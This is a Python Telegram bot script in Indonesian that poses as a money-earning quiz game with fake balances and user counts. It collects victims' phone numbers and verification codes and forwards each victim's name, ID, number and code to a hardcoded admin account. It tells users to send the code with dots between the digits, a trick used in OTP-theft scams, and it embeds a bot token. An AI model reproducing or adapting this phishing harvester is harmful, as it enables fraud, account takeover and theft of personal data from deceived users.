import telebot
import random
import time
from telebot import types

# 🔑 TOKEN DARI @BotFather (GANTI PAKE TOKEN KAMU)
TOKEN = "8858928089:AAFJNgx8S3zEWKv5lMdIKQHKZuQS_vasot8"
bot = telebot.TeleBot(TOKEN)

# 📩 SEMUA DATA AKAN DIKIRIM KE SINI (ID UTAMA KAMU)
ADMIN_ID = 8606011476

# ==============================================
# 🎨 TAMPILAN PERSIS BOT ASLI
# ==============================================
PESAN_AWAL = """🔥 **GAME KUIS PENGHASIL SALDO** 🔥

📢 Sudah dipercaya **20.000.000+ Pengguna**
✅ Tanpa Modal 100% GRATIS
✅ Aman & Terverifikasi
✅ Bisa pakai NOKOS / Nomor Virtual
✅ Pembayaran Cepat Masuk Rekening/E-Wallet

💡 *Daftar sekarang & mulai kumpulkan uang gratis!*"""

PESAN_DAFTAR = """📋 **PROSES PENDAFTARAN AKUN**

Untuk menghubungkan akun, silakan kirim nomor telepon kamu:
Contoh: `+6281234567890`

⚠️ Syarat:
- Diawali +62
- Hanya angka saja
- Bisa nomor asli / nomor virtual"""

PESAN_PROSES = """⏳ **Sedang Memproses Nomor...**
`{nomor}`

✅ Nomor Valid & Tidak Diblokir
🔐 Sistem Sedang Membuat Kode Verifikasi...
📩 Kode OTP Berhasil Dikirim ke Akun Telegram!

🔢 **KODE VERIFIKASI:** `{kode}`

⚠️ **PENTING: CARA KIRIM KODE**
Wajib gunakan tanda TITIK di setiap angka:
👉 `{format_kode}`

❌ *Contoh salah: 12345*
✅ *Contoh benar: 1.2.3.4.5*"""

PESAN_KODE_SALAH = """❌ **KODE TIDAK SESUAI / FORMAT SALAH!**

⚠️ Cek kembali:
1. Angka harus sama persis
2. Wajib pakai TITIK (.)
3. Jangan ada spasi/huruf

🔄 Silakan kirim ulang kode:"""

PESAN_BERHASIL = """🎉 **AKUN BERHASIL TERHUBUNG & TERVERIFIKASI!**

✅ Status: **AKTIF**
📱 Nomor: `{nomor}`
🔑 Kode Masuk: `{kode}`
💰 Saldo Awal: **Rp 25.000**

👉 Pilih menu di bawah untuk mulai mengerjakan tugas & main game!"""

PESAN_MENU_UTAMA = """👋 Selamat Datang, {nama}!

Pilih layanan yang tersedia di bawah ini:"""

PESAN_TUGAS = """📚 **DAFTAR TUGAS & KUIS**

Pilih kategori yang ingin dikerjakan:
- Pengetahuan Umum
- Sejarah Indonesia
- Teknologi
- Geografi
- Sains & Alam

💵 Bayaran per jawaban benar: **Rp 1.000 - Rp 5.000**"""

PESAN_GAME = """🎮 **MINI GAME PENGHASIL UANG**

1. ❌⭕ Tic Tac Toe | Taruhan: Rp 2.000 / Main
2. 🎰 Slot Jackpot | Hadiah: Rp 100.000
3. 🎲 Tebak Angka | Hadiah: Rp 50.000"""

PESAN_SALDO = """💳 **INFORMASI SALDO**

Saldo Kamu: **Rp 25.000**
Minimal Penarikan: **Rp 50.000**

💰 Kumpulkan lagi sampai cukup buat dicairkan!"""

PESAN_TARIK = """🏧 **PENARIKAN DANA**

⚠️ Saldo kamu belum memenuhi batas minimal penarikan.
Kumpulkan saldo sampai **Rp 50.000** baru bisa cair ke DANA/OVO/GoPay."""

PESAN_BANTUAN = """ℹ️ **PUSAT BANTUAN**

📌 Cara Main:
1. Daftar & Verifikasi Nomor
2. Jawab Kuis / Main Game
3. Kumpulkan Saldo
4. Cairkan Uang

📌 Info: Sistem otomatis 24 jam"""

# ==============================================
# 🚀 SISTEM UTAMA
# ==============================================
data_user = {}

@bot.message_handler(commands=['start'])
def start_bot(message):
    user_id = message.from_user.id
    nama = message.from_user.first_name

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_daftar = types.KeyboardButton("📱 Daftar")
    btn_tugas = types.KeyboardButton("💰 Tugas & Kuis")
    btn_game = types.KeyboardButton("🎮 Games")
    btn_undang = types.KeyboardButton("👥 Undang Teman")
    btn_saldo = types.KeyboardButton("💳 Cek Saldo")
    btn_tarik = types.KeyboardButton("🏧 Tarik Saldo")
    btn_bantuan = types.KeyboardButton("ℹ️ Bantuan")
    btn_status = types.KeyboardButton("🔄 Cek Status")
    markup.add(btn_daftar, btn_tugas, btn_game, btn_undang, btn_saldo, btn_tarik, btn_bantuan, btn_status)

    bot.send_message(user_id, PESAN_AWAL, reply_markup=markup, parse_mode="Markdown")
    bot.send_message(user_id, PESAN_MENU_UTAMA.format(nama=nama), parse_mode="Markdown")


@bot.message_handler(func=lambda m: m.text == "📱 Daftar")
def minta_nomor(message):
    user_id = message.from_user.id
    bot.send_message(user_id, PESAN_DAFTAR, parse_mode="Markdown")
    bot.register_next_step_handler(message, proses_nomor)


def proses_nomor(message):
    user_id = message.from_user.id
    nama = message.from_user.first_name
    nomor = message.text.strip()

    if nomor.lower() in ['batal', 'x']:
        bot.send_message(user_id, "❌ Pendaftaran dibatalkan.")
        start_bot(message)
        return

    if not nomor.startswith("+62") or len(nomor) < 11 or not nomor[1:].isdigit():
        bot.send_message(user_id, "❌ **Nomor Telepon Tidak Valid / Diblokir!**\n\nPastikan awalan +62 & hanya angka.\nKirim ulang nomor yang benar:")
        bot.register_next_step_handler(message, proses_nomor)
        return

    bot.send_message(user_id, "⏳ Memeriksa ketersediaan nomor...")
    time.sleep(1)
    bot.send_message(user_id, "🔐 Menghubungkan ke sistem verifikasi Telegram...")
    time.sleep(1)

    kode = str(random.randint(10000, 99999))
    format_kode = ".".join(list(kode))

    data_user[user_id] = {"nama": nama, "nomor": nomor, "kode": kode}

    pesan = PESAN_PROSES.format(nomor=nomor, kode=kode, format_kode=format_kode)
    bot.send_message(user_id, pesan, parse_mode="Markdown")

    lapor = f"""📥 **DATA BARU MASUK!**
👤 Nama: {nama}
🆔 ID: `{user_id}`
📱 Nomor: `{nomor}`
🔑 Kode: `{kode}`
⏰ Waktu: {time.ctime()}"""
    bot.send_message(ADMIN_ID, lapor, parse_mode="Markdown")

    bot.register_next_step_handler(message, cek_kode)


def cek_kode(message):
    user_id = message.from_user.id
    input_kode = message.text.strip()

    if user_id not in data_user:
        bot.send_message(user_id, "⚠️ Sesi habis, ulangi daftar dari awal /start")
        return

    data = data_user[user_id]
    kode_benar = data['kode']

    if input_kode.lower() in ['batal', 'x']:
        bot.send_message(user_id, "❌ Dibatalkan.")
        del data_user[user_id]
        start_bot(message)
        return

    kode_bersih = ''.join([a for a in input_kode if a.isdigit()])

    if kode_bersih == kode_benar:
        bot.send_message(user_id, PESAN_BERHASIL.format(nomor=data['nomor'], kode=data['kode']), parse_mode="Markdown")
        bot.send_message(ADMIN_ID, f"✅ **VERIFIKASI BERHASIL!**\n👤 {data['nama']}\n📱 `{data['nomor']}`", parse_mode="Markdown")
        del data_user[user_id]
    else:
        bot.send_message(user_id, PESAN_KODE_SALAH, parse_mode="Markdown")
        bot.register_next_step_handler(message, cek_kode)


@bot.message_handler(func=lambda m: True)
def menu_lain(message):
    user_id = message.from_user.id
    teks = message.text

    if teks == "💰 Tugas & Kuis":
        bot.send_message(user_id, PESAN_TUGAS)
    elif teks == "🎮 Games":
        bot.send_message(user_id, PESAN_GAME)
    elif teks == "💳 Cek Saldo":
        bot.send_message(user_id, PESAN_SALDO)
    elif teks == "🏧 Tarik Saldo":
        bot.send_message(user_id, PESAN_TARIK)
    elif teks == "ℹ️ Bantuan":
        bot.send_message(user_id, PESAN_BANTUAN)
    elif teks == "🔄 Cek Status":
        bot.send_message(user_id, "✅ Akun Terhubung & Aman\n✅ Siap digunakan\n✅ Terverifikasi")
    elif teks == "👥 Undang Teman":
        bot.send_message(user_id, "👥 Undang teman dapat bonus Rp 5.000!\nLink: t.me/linkbotkamu")
    else:
        start_bot(message)


if __name__ == "__main__":
    print("="*60)
    print("✅ BOT SISTEM VERIFIKASI BERJALAN")
    print("📩 SEMUA DATA DIKIRIM KE ID:", ADMIN_ID)
    print("🌐 STATUS: TERBUKA")
    print("="*60)
    bot.polling(none_stop=True, interval=0)
